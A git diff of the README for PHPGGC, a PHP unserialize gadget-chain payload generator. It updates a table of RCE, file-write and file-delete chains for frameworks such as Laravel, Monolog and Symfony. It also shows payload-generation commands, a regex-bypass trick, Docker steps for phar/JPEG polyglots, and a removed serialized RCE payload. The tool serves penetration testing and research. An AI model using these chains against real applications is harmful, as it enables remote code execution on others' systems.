@@ -24,107 +24,19 @@ NAME                                      VERSION                               
 Bitrix/RCE1                               17.x.x <= 22.0.300                                   RCE (Function call)    __destruct          
 CakePHP/RCE1                              ? <= 3.9.6                                           RCE (Command)          __destruct          
 CakePHP/RCE2                              ? <= 4.2.3                                           RCE (Function call)    __destruct          
+CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                       File read              __toString     *    
 CodeIgniter4/RCE1                         4.0.2 <= 4.0.3                                       RCE (Function call)    __destruct          
-CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.0.4+                                 RCE (Function call)    __destruct          
-CodeIgniter4/RCE3                         -4.1.3+                                              RCE (Function call)    __destruct          
+CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                  RCE (Function call)    __destruct          
+CodeIgniter4/RCE3                         4.0.4 <= 4.3.6                                       RCE (Function call)    __destruct          
 CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                           RCE (Function call)    __destruct          
+CodeIgniter4/RCE5                         -4.1.3+                                              RCE (Function call)    __destruct          
+CodeIgniter4/RCE6                         -4.1.3 <= 4.2.10+                                    RCE (Function call)    __destruct          
 Doctrine/FW1                              ?                                                    File write             __toString     *    
 Doctrine/FW2                              2.3.0 <= 2.4.0 v2.5.0 <= 2.8.5                       File write             __destruct     *    
-Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     * 
-Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     * 
+Doctrine/RCE1                             1.5.1 <= 2.7.2                                       RCE (PHP code)         __destruct     *    
+Doctrine/RCE2                             1.11.0 <= 2.3.2                                      RCE (Function call)    __destruct     *    
 Dompdf/FD1                                1.1.1 <= ?                                           File delete            __destruct     *    
-Dompdf/FD2                                ? < 1.1.1                                            File delete            __destruct     *    
-Drupal7/FD1                               7.0 < ?                                              File delete            __destruct     *    
-Drupal7/RCE1                              7.0.8 < ?                                            RCE (Function call)    __destruct     *    
-Guzzle/FW1                                6.0.0 <= 6.3.3+                                      File write             __destruct          
-Guzzle/INFO1                              6.0.0 <= 6.3.2                                       phpinfo()              __destruct     *    
-Guzzle/RCE1                               6.0.0 <= 6.3.2                                       RCE (Function call)    __destruct     *    
-Horde/RCE1                                <= 5.2.22                                            RCE (PHP code)         __destruct     *    
-Kohana/FR1                                3.*                                                  File read              __toString     *    
-Laminas/FD1                               <= 2.11.2                                            File delete            __destruct          
-Laminas/FW1                               2.8.0 <= 3.0.x-dev                                   File write             __destruct     *    
-Laravel/RCE1                              5.4.27                                               RCE (Function call)    __destruct          
-Laravel/RCE2                              5.4.0 <= 8.6.9+                                      RCE (Function call)    __destruct          
-Laravel/RCE3                              5.5.0 <= 5.8.35                                      RCE (Function call)    __destruct     *    
-Laravel/RCE4                              5.4.0 <= 8.6.9+                                      RCE (Function call)    __destruct          
-Laravel/RCE5                              5.8.30                                               RCE (PHP code)         __destruct     *    
-Laravel/RCE6                              5.5.* <= 5.8.35                                      RCE (PHP code)         __destruct     *    
-Laravel/RCE7                              ? <= 8.16.1                                          RCE (Function call)    __destruct     *    
-Laravel/RCE8                              7.0.0 <= 8.6.9+                                      RCE (Function call)    __destruct     *    
-Laravel/RCE9                              5.4.0 <= 9.1.8+                                      RCE (Function call)    __destruct          
-Laravel/RCE10                             5.6.0 <= 9.1.8+                                      RCE (Function call)    __toString          
-Laravel/RCE11                             5.4.0 <= 9.1.8+                                      RCE (Function call)    __destruct          
-Laravel/RCE12                             5.8.35, 7.0.0, 9.3.10                                RCE (Function call)    __destruct     *    
-Magento/FW1                               ? <= 1.9.4.0                                         File write             __destruct     *    
-Magento/SQLI1                             ? <= 1.9.4.0                                         SQL injection          __destruct          
-Magento2/FD1                              *                                                    File delete            __destruct     *    
-Monolog/FW1                               3.0.0 <= 3.1.0+                                      File write             __destruct     *    
-Monolog/RCE1                              1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+                      RCE (Function call)    __destruct          
-Monolog/RCE2                              1.4.1 <= 2.7.0+                                      RCE (Function call)    __destruct          
-Monolog/RCE3                              1.1.0 <= 1.10.0                                      RCE (Function call)    __destruct          
-Monolog/RCE4                              ? <= 2.4.4+                                          RCE (Command)          __destruct     *    
-Monolog/RCE5                              1.25 <= 2.7.0+                                       RCE (Function call)    __destruct          
-Monolog/RCE6                              1.10.0 <= 2.7.0+                                     RCE (Function call)    __destruct          
-Monolog/RCE7                              1.10.0 <= 2.7.0+                                     RCE (Function call)    __destruct     *    
-Monolog/RCE8                              3.0.0 <= 3.1.0+                                      RCE (Function call)    __destruct     *    
-Monolog/RCE9                              3.0.0 <= 3.1.0+                                      RCE (Function call)    __destruct     *    
-Phalcon/RCE1                              <= 1.2.2                                             RCE                    __wakeup       *    
-PHPCSFixer/FD1                            <= 2.17.3                                            File delete            __destruct          
-PHPCSFixer/FD2                            <= 2.17.3                                            File delete            __destruct          
-PHPExcel/FD1                              1.8.2+                                               File delete            __destruct          
-PHPExcel/FD2                              <= 1.8.1                                             File delete            __destruct          
-PHPExcel/FD3                              1.8.2+                                               File delete            __destruct          
-PHPExcel/FD4                              <= 1.8.1                                             File delete            __destruct          
-PHPSecLib/RCE1                            2.0.0 <= 2.0.34                                      RCE (PHP code)         __destruct     *    
-Pydio/Guzzle/RCE1                         < 8.2.2                                              RCE (Function call)    __toString          
-Slim/RCE1                                 3.8.1                                                RCE (Function call)    __toString          
-Smarty/FD1                                ?                                                    File delete            __destruct          
-Smarty/SSRF1                              ?                                                    SSRF                   __destruct     *    
-Spiral/RCE1                               2.7.0 <= 2.8.13                                      RCE (Function call)    __destruct          
-Spiral/RCE2                               -2.8+                                                RCE (Function call)    __destruct     *    
-SwiftMailer/FD1                           -5.4.12+, -6.2.1+                                    File delete            __destruct          
-SwiftMailer/FW1                           5.1.0 <= 5.4.8                                       File write             __toString          
-SwiftMailer/FW2                           6.0.0 <= 6.0.1                                       File write             __toString          
-SwiftMailer/FW3                           5.0.1                                                File write             __toString          
-SwiftMailer/FW4                           4.0.0 <= ?                                           File write             __destruct          
-Symfony/FW1                               2.5.2                                                File write             DebugImport    *    
-Symfony/FW2                               3.4                                                  File write             __destruct          
-Symfony/RCE1                              3.3                                                  RCE (Command)          __destruct     *    
-Symfony/RCE2                              2.3.42 < 2.6                                         RCE (PHP code)         __destruct     *    
-Symfony/RCE3                              2.6 <= 2.8.32                                        RCE (PHP code)         __destruct     *    
-Symfony/RCE4                              3.4.0-34, 4.2.0-11, 4.3.0-7                          RCE (Function call)    __destruct     *    
-Symfony/RCE5                              5.2.*                                                RCE (Function call)    __destruct          
-Symfony/RCE6                              v3.4.0-BETA4 <= v3.4.49 & v4.0.0-BETA4 <= v4.1.13    RCE (Command)          __destruct     *    
-TCPDF/FD1                                 <= 6.3.5                                             File delete            __destruct     *    
-ThinkPHP/FW1                              5.0.4-5.0.24                                         File write             __destruct     *    
-ThinkPHP/FW2                              5.0.0-5.0.03                                         File write             __destruct     *    
-ThinkPHP/RCE1                             5.1.x-5.2.x                                          RCE (Function call)    __destruct     *    
-ThinkPHP/RCE2                             5.0.24                                               RCE (Function call)    __destruct     *    
-Typo3/FD1                                 4.5.35 <= 10.4.1                                     File delete            __destruct     *    
-WordPress/Dompdf/RCE1                     0.8.5+ & WP < 5.5.2                                  RCE (Function call)    __destruct     *    
-WordPress/Dompdf/RCE2                     0.7.0 <= 0.8.4 & WP < 5.5.2                          RCE (Function call)    __destruct     *    
-WordPress/Guzzle/RCE1                     4.0.0 <= 6.4.1+ & WP < 5.5.2                         RCE (Function call)    __toString     *    
-WordPress/Guzzle/RCE2                     4.0.0 <= 6.4.1+ & WP < 5.5.2                         RCE (Function call)    __destruct     *    
-WordPress/P/EmailSubscribers/RCE1         4.0 <= 4.4.7+ & WP < 5.5.2                           RCE (Function call)    __destruct     *    
-WordPress/P/EverestForms/RCE1             1.0 <= 1.6.7+ & WP < 5.5.2                           RCE (Function call)    __destruct     *    
-WordPress/P/WooCommerce/RCE1              3.4.0 <= 4.1.0+ & WP < 5.5.2                         RCE (Function call)    __destruct     *    
-WordPress/P/WooCommerce/RCE2              <= 3.4.0 & WP < 5.5.2                                RCE (Function call)    __destruct     *    
-WordPress/P/YetAnotherStarsRating/RCE1    ? <= 1.8.6 & WP < 5.5.2                              RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE1                   1.8.2+ & WP < 5.5.2                                  RCE (Function call)    __toString     *    
-WordPress/PHPExcel/RCE2                   <= 1.8.1 & WP < 5.5.2                                RCE (Function call)    __toString     *    
-WordPress/PHPExcel/RCE3                   1.8.2+ & WP < 5.5.2                                  RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE4                   <= 1.8.1 & WP < 5.5.2                                RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE5                   1.8.2+ & WP < 5.5.2                                  RCE (Function call)    __destruct     *    
-WordPress/PHPExcel/RCE6                   <= 1.8.1 & WP < 5.5.2                                RCE (Function call)    __destruct     *    
-Yii/RCE1                                  1.1.20                                               RCE (Function call)    __wakeup       *    
-Yii2/RCE1                                 <2.0.38                                              RCE (Function call)    __destruct     *    
-Yii2/RCE2                                 <2.0.38                                              RCE (PHP code)         __destruct     *    
-ZendFramework/FD1                         ? <= 1.12.20                                         File delete            __destruct          
-ZendFramework/RCE1                        ? <= 1.12.20                                         RCE (PHP code)         __destruct     *    
-ZendFramework/RCE2                        1.11.12 <= 1.12.20                                   RCE (Function call)    __toString     *    
-ZendFramework/RCE3                        2.0.1 <= ?                                           RCE (Function call)    __destruct          
-ZendFramework/RCE4                        ? <= 1.12.20                                         RCE (PHP code)         __destruct     *    
-ZendFramework/RCE5                        2.0.0rc2 <= 2.5.3                                    RCE (Function call)    __destruct
+...
 ```
 
 Filter gadget chains:
@@ -171,9 +83,9 @@ Exec through proc_open()
 ```
 
 For RCE gadgets, the executed command can have 3 formatting types depending on how the gadget works:
-- RCE (Command): ./phpggc Symfony/RCE1 id
-- RCE (PHP code): ./phpggc Symfony/RCE2 'phpinfo();'
-- RCE (Function call): ./phpggc Symfony/RCE4 system id
+- RCE (Command): `./phpggc Symfony/RCE1 id`
+- RCE (PHP code): `./phpggc Symfony/RCE2 'phpinfo();'`
+- RCE (Function call): `./phpggc Symfony/RCE4 system id`
 
 Once you have selected a chain, run `./phpggc <gadget-chain> [parameters]` to obtain the payload.
 For instance, to obtain a payload for Monolog, you'd do:
@@ -233,7 +145,7 @@ a:1:{s:7:"message";O:18:"Slim\Http\Response":2:{...}}
 
 ### History
 
-At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (`file_exists`, `fopen`, etc.). The paper is [here](https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf).
+At BlackHat US 2018, @s_n_t released PHARGGC, a fork of PHPGGC which instead of building a serialized payload, builds a whole PHAR file. This PHAR file contains serialized data and as such can be used for various exploitation techniques (`file_exists`, `fopen`, etc.). The paper is [here](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf).
 
 ### Implementation
 
@@ -290,6 +202,13 @@ This comes handy when a firewall or PHP code blocks strings.
 
 Sometimes, PHP scripts verify that the given serialized payload does not contain objects by using a regex such as `/O:[0-9]+:`. This is easily bypassed using `O:+123:...` instead of `O:123:`. One can use `--plus-numbers <types>`, or `-n <types>`, to automatically add these `+` signs in front of symbols.
 For instance, to obfuscate objects and strings, one can use: `--n Os`. Please note that since PHP 7.2, only `i` and `d` (float) types can have a `+`.
+
+### Public Properties
+
+Attempts to convert references to protected or private properties within the serialized payload to public.
+This can be useful because when PHP serializes a non-public property of an object it prepends the property name with an asterisk (for protected) or the class name (for private) surrounded by null bytes, which are easy to lose if the payload is transmitted or stored as plain text without encoding. If that happens, the payload will fail to unserialize because the string length of the property name (and the name itself) will be incorrect.
+As an added bonus, payloads are slightly smaller without the prefixes. Converting properties to public tends to work in more recent PHP versions but can cause problems in older versions (before PHP 7.2).
+This functionality may not work properly if a chain includes one or more objects that have a custom serialize / unserialize implementation.
 
 ### Testing your chain
 
@@ -412,22 +331,46 @@ You can define pre- and post- processing methods, if parameters need to be modif
 Hopefully, the already implemented gadgets should be enough for you to build yours.
 Otherwise, I'd be glad to answer your questions.
 
+Please test as many versions as you can. The nomenclature for versions is as such: `[-]<lower-version> <= <higher-version>[+]`. The `-` and `+` signs indicate that your payload may work on respectively lower and higher versions. For instance, if your gadget chain works from version 2.0.0 to version 4.4.1, which is the last version at the time, use `2.0.0 <= 4.4.1+`.
+
 The `--new <framework> <type>` command-line option can be used to create the directory and file structure for a new gadget chain.
 For instance, use `./phpggc -n Drupal RCE` would create a new Drupal RCE gadgetchain.
 
 
 # Docker
 
-If you don't want to install PHP, you can use `docker build . -t 'phpggc'`.
+If you don't want to install PHP, you can build a docker image using:
 
-To generate a gadget chain.
+```
+$ docker build . -t 'phpggc'
+```
+
+You can then used the dockerized `phpggc`.
+
+### To generate a gadget chain
 
 ```
 $ docker run phpggc Monolog/rce1 'system' 'id'
-O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";r:2;s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}
 ```
 
-To run `test-gc-compatibility.py` from docker.
+### To test a chain 
+
+Jump to your environment's folder and run the chain argument-free, with the `--test-payload` option:
+
+```
+$ docker run -v "$(pwd)":/app -w /app phpggc Monolog/RCE9 --test-payload
+```
+
+### To generate phar / polyglot files
+
+> Note: The command must be executed in the directory where the input image is located.
+
+```
+$ docker run -v "$(pwd)":/images phpggc -pj /images/dummy.jpg -o /images/z.zip.phar Monolog/RCE9 system id
+```
+
+### To run `test-gc-compatibility.py`
+
 ```
 $ docker run --entrypoint './test-gc-compatibility.py' phpggc doctrine/doctrine-bundle:2.2,2.7.2 doctrine/rce1 doctrine/rce2
 Runing on PHP version ('PHP 8.1.13 (cli) (built: Nov 30 2022 21:53:44) (NTS).
